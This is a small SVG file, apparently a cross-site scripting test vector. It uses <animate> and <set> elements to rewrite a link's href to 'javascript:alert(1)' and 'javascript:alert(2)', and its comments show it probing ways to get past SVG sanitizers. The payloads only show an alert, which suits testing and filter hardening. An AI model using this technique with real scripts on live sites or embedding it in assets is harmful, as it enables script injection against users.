<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="500" height="500">
  <a id="link" href="/safe">
    <text x="50" y="50">Click me</text>
  </a>
  <!-- Try animate with href as default attribute for <a> -->
  <animate href="#link" attributeName="href" to="javascript:alert(1)" begin="0s" fill="freeze"/>
  <!-- Try using begin event to chain -->
  <set id="s1" href="#link" attributeName="href" to="javascript:alert(2)" begin="click"/>
</svg>
